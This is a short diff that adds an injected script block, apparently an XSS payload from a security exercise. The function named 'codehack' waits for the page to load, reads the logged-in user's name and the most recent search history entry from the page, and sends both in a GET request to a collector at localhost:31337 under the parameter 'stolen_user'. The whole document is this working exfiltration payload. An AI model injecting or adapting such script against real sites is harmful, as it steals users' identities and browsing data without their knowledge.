@@ -1,0 +1,13 @@
+<script>
+function codehack() {
+	document.addEventListener("DOMContentLoaded",function(event) {
+		var user = document.getElementById("logged-in-user").innerHTML;
+		alert(user);
+		var search = document.getElementById("history-list").children[1].innerHTML;
+		var url = "http://localhost:31337/?stolen_user="+user+"&last_search="+search;
+		var xhr=new XMLHttpRequest();
+		xhr.open("GET", url, true);
+		xhr.send("stolen_user="+user+"&last_search"+search);
+	})
+}
+</script>
